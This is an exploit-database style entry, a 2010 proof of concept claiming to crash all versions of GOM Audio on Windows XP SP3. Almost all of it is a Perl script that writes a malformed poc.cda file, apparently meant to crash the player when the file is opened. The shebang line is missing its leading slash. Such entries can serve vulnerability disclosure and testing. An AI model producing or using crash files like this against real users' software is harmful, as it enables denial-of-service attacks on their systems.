# Exploit Title: [GOM Audio Local crash poc]
# Date: [2010.01.05]
# Author: [applicationlayer@gmail.com]
# Version: [all versions]
# Tested on: [xp sp3]
#!usr/bin/perl
$file="poc.cda";
$boom="A" x 10;
open(myfile,">>$file");
print myfile $boom;
close(myfile);